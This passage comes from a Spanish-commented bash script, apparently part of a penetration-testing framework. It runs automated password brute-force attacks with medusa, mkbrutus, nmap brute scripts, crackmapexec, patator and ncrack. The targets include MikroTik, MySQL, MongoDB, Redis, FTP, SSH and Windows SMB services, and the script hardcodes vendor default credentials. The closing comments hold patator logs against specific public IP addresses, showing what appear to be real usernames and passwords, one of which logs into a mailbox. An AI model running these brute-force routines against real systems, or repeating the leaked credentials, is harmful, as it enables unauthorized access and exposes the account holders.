	echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	for ip in $(cat servicios/MikroTik.txt); do		
		echo -e "[+] Probando $ip"
				
		echo "mkbrutus.py -t $ip -u admin --dictionary passwords.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
		mkbrutus.py -t $ip -u admin --dictionary passwords.txt>>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
		
		echo "" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
		echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
		mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt>> logs/cracking/"$ip"_8728_passwordMikroTik.txt

		grep --color=never successful logs/cracking/"$ip"_8728_passwordMikroTik.txt | grep -v "unsuccessful" > .vulnerabilidades/"$ip"_8728_passwordMikroTik.txt
		
		
		echo ""			
	done
	insert_data	
fi

if [ -f servicios/mysql.txt ]
then
       	
	echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
#	sed -i '1 i\mysql' passwords.txt	#adicionar password mysql
	for line in $(cat servicios/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		hostlive=`mysql -u mysql -pww $ip`				
		#error
		if [[ ${hostlive} == *"MySQL server through socket"*  ]];then   	  
			echo "El servicio no esta funcionando correctamente"
							
		else
			echo -e "\n medusa -e n -u root -P passwords.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt 
			medusa -e n -u root -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
			
			echo -e "\n medusa -e n -u mysql -P passwords.txt -h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -e n -u mysql -P passwords.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
			
			echo -e "\n medusa -e n -u admin -P passwords.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
			medusa -e n -u admin -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
			
			echo -e "\n medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			medusa -e n -u $admin_user -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
			
			#echo -e "\n medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			#medusa -e n -u $ENTIDAD  -P passwords.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
			
			grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_3306_passwordBD.txt
			echo ""		
			
		fi				
	done
	insert_data			
fi



#if [ -f servicios/vmware.txt ]
#then

	#if [ "$TYPE" = NULL ] ; then
		#echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
		#read bruteforce	     
	#fi
	  	
	#if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 
      	  
	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  #for line in $(cat servicios/vmware.txt); do
		#ip=`echo $line | cut -f1 -d":"`
		#port=`echo $line | cut -f2 -d":"`
		#echo -e "[+] Probando $ip"
#		medusa -e n -u root -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
		#medusa -e n -u $entidad  -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinadoServ.txt
#		echo ""			
	 #done
	 #insert_data
#	fi # if bruteforce
#fi


if [ -f servicios/mongoDB.txt ]
then     	  
	echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
	for line in $(cat servicios/mongoDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Probando $ip"
		echo "nmap -n -sV -p $port --script=mongodb-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sV -p $port --script=mongodb-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		# -- |     root:Password1 - Valid credentials		
		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[MongoDB] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
		fi					 
		echo ""
	done
	insert_data	
fi

if [ -f servicios/redis.txt ]
then
	 	  
	echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
	for line in $(cat servicios/redis.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo "nmap -n -sV -p $port --script=redis-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
		nmap -n -sV -p $port --script=redis-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 		
		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[Redis] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
		fi			
		echo ""			
	done
	insert_data	
fi

#falta
if [ -f servicios/informix.txt ]
then	
   	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass informix (SFI) ######################$RESET"	
	  for line in $(cat servicios/informix.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		echo -e "\t [+] Probando password por defecto (SFI)"
		
		echo -e "\n medusa -u tbsai -p Tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u tbsai -p Tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u tbsai -p tbsai -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u tbsai -p tbsai -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u sfibak -p sfibak -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u sfibak -p sfibak -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u sfi -p sfi -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		medusa -u sfi -p sfi -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null
		
		echo -e "\n medusa -u informix -p informix -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
		medusa -u informix -p informix -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordSFI.txt 2>/dev/null		
		
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordSFI.txt > .vulnerabilidades/"$ip"_22_passwordSFI.txt 					
	 done
	 insert_data	
fi



if [ -f servicios/ftp.txt ]
then 
      	  
	echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
	for line in $(cat servicios/ftp.txt); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`
	
	
	######## revisar si no es impresora #####
	#banner ftp
	egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_21.txt
	noImpresora_port21=$?
	
	#banner telnet						
	noImpresora_port23=1		
	if [ -f .banners2/"$ip"_23.txt ] 
	then				
		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_23.txt 2>/dev/null
		noImpresora_port23=$?
	fi
	
	#banner web
	noImpresora_port80=1		
	if [ -f .enumeracion2/"$ip"_80_webData.txt ] 
	then	
		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
		noImpresora_port80=$?
	fi
			
	echo "noImpresora_port21 $noImpresora_port21 noImpresora_port80 $noImpresora_port80 noImpresora_port23 $noImpresora_port23"
	if [[ $noImpresora_port21 -eq 1 && $noImpresora_port80 -eq 1 && $noImpresora_port23 -eq 1 ]] ; then			
		echo -e "[+] Probando $ip"		
		
		#echo -e "\n medusa -e n -u admin -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		#medusa -e n -u admin -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		
		#echo -e "\n medusa  -u root -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		#medusa  -u root -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
		
		echo -e "\n medusa  -u ftp -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
		medusa -u ftp -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
		
		respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[FTP] $respuesta" | grep -iv 'passFakeTest123' >> .vulnerabilidades/"$ip"_21_passwordAdivinadoServ.txt
		fi
		
		echo ""		
	else			
		echo -e "\t[+] Es una impresora"			

		echo ""		
	fi	
	#######################################		
			
	done
	insert_data	 
fi


### Windows
if [ -f servicios/Windows.txt ]
then
	echo -e "\n\t $OKBLUE Testing windows auth  $RESET"	  	
	
	interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $admin_user -p /home/passwords.txt' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent

	interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $admin_user -p /home/passwords.txt | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent

	if [[ "$MODE" == "vulnerabilidades"  ]]; then 

		if [ "$LANGUAGE" == "es" ]; then
			interlace -tL servicios/Windows.txt -threads 10 -c "echo -e 'docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u soporte -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
			interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u soporte -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
			
			interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u sistemas -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
			interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u sistemas -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
		fi
			
		interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $ENTIDAD -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
		interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $ENTIDAD -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent		
	fi	
fi
#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
#grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
#grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log

######## wait to finish########
while true; do
	scan_instancias=$((`ps aux | egrep 'medusa|docker' | egrep -v 'dockerd|grep' | wc -l` - 1)) 
	if [ "$scan_instancias" -gt 0 ]
	then
		echo -e "\t[i] Todavia hay escaneos de medusa/docker activos ($scan_instancias)"  
		sleep 30
	else
		break		  		 
	fi				
done
##############################

if [ -f servicios/ssh_onlyhost.txt ]
then		
	for ip in $(cat servicios/ssh_onlyhost.txt); do			
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt 2>/dev/null					
	 done	
	insert_data
fi




if [ -f servicios/Windows.txt ]
then		
	for ip in $(cat servicios/Windows.txt); do					
		grep -ira '\[+\]' logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt  | grep -iav 'passFakeTest123' > .vulnerabilidades/"$ip"_windows_passwordAdivinadoWin.txt
		#https://github.com/m4ll0k/SMBrute (shared)											
	 done	
	 insert_data
fi

			
if [ -f servicios/telnet_onlyhost.txt ]
then
		
	for ip in $(cat servicios/telnet_onlyhost.txt); do			
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_23_passwordAdivinadoServ.txt 2>/dev/null					
	 done	
	insert_data
fi





# if [ -f servicios/pop.txt ]
# then
# 	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
# 	read bruteforce	  
	  
# 	if [ $bruteforce == 's' ]
#     then     			
#       echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
# 	  read users_file  	  
	  
# 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
# 	  for line in $(cat servicios/pop.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"	
# 		for fullname in $(cat $users_file); do
# 			echo -e "\n\t########### Testing fullname $fullname #######"			
# 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
# 			head -1 passwords2.txt > base.txt # solo primer nombre
# 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
# 			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
# 			username=`tail -1 passwords2.txt` # dtorres
# 			echo -e "\n\t[+] username $username"			
# 			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop-$username.txt 2>> logs/cracking/"$ip"_pop-$username.txt		
# 			grep --color=never messages logs/cracking/"$ip"_pop-$username.txt >> .vulnerabilidades/"$ip"_pop_passwordAdivinadoServ.txt
# 			echo ""					
# 			rm passwords.txt passwords2.txt passwords3.txt			
# 			echo "Dormir 5 min"
# 			sleep 300;
# 		done					
# 		echo ""			
# 	 done
# 	 insert_data
# 	fi # if bruteforce
# fi
	

# if [ -f servicios/pop3pw.txt ]
# then
# 	echo -e "\n\t $OKBLUE Encontre servicios de pop3pw activos. Realizar ataque de passwords ? s/n $RESET"	  
# 	read bruteforce	  
	  
# 	if [ $bruteforce == 's' ]
#     then     			
#       echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
# 	  read users_file  	  
	  
# 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP  ######################$RESET"	
# 	  for line in $(cat servicios/pop3pw.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"	
# 		for fullname in $(cat $users_file); do
# 			echo -e "\n\t########### Testing fullname $fullname #######"			
# 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
# 			head -1 passwords2.txt > base.txt # solo primer nombre
# 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
# 			cat passwords2.txt passwords3.txt passwords.txt| sort | uniq > passwords.txt			
# 			username=`tail -1 passwords2.txt` # dtorres
# 			echo -e "\n\t[+] username $username"			
# 			patator.py pop_passd host=$ip user=$username password=FILE0 0=passwords.txt >> logs/cracking/"$ip"_pop3pw-$username.txt 2>> logs/cracking/"$ip"_pop3pw-$username.txt		
# 			grep --color=never "new password " logs/cracking/"$ip"_pop3pw-$username.txt >> .vulnerabilidades/"$ip"_pop3pw_passwordAdivinadoServ.txt
# 			echo ""					
# 			rm passwords.txt passwords2.txt passwords3.txt			
# 			echo "Dormir 5 min"
# 			sleep 300;
# 		done					
# 		echo ""			
# 	 done
# 	 insert_data
# 	fi # if bruteforce
# fi	


# if [ -f servicios/vnc.txt ]
# then   	  
# 	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
# 	  for line in $(cat servicios/vnc.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"					
# 		ncrack_instances=`pgrep ncrack | wc -l`
# 		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
# 		then
# 			ncrack --user "$admin_user" -P passwords.txt-p $port -g cd=8 $ip | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
# 			echo ""		
# 		else
# 			echo "Max instancias de ncrack ($max_ins)"
# 			sleep 10;
				
# 		fi		
		
# 	  done
	  
# 	  sleep 5
# 	  ### wait to finish
# 	  while true; do
# 		ncrack_instances=`pgrep ncrack | wc -l`
# 		if [ "$ncrack_instances" -gt 0 ]
# 		then
# 			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
# 			sleep 30
# 		else
# 			break		  		 
# 		fi				
# 	  done
	
# 	  echo -e "\n\t########### Checking success #######"	
# 	  for line in $(cat servicios/vnc.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
						
# 		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
# 		echo ""			
# 	  done
	 	 	 
# 	 insert_data	
# fi
	

#patator.py pop_login host=181.115.239.243 user=msanti password='Bichito$9'
#17:20:24 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 17:20 EDT
#17:20:24 patator.py    INFO -                                                                              
#17:20:24 patator.py    INFO - code  size   time | candidate                          |   num | mesg
#17:20:24 patator.py    INFO - -----------------------------------------------------------------------------
#17:20:25 patator.py    INFO - +OK   32    0.094 |                                    |     1 | 3076 messages (263203895 octets)


#patator.py pop_passd host=190.129.11.29 user=jaguilar password=jhashy275
#16:40:34 patator.py    INFO - Starting patator.py v0.6 (http://code.google.com/p/patator.py/) at 2018-10-22 16:40 EDT
#16:40:34 patator.py    INFO -                                                                              
##16:40:34 patator.py    INFO - code  size   time | candidate                          |   num | mesg
#16:40:34 patator.py    INFO - -----------------------------------------------------------------------------
#16:40:34 patator.py    INFO - 200   25    0.127 |                                    |     1 | Your new password please
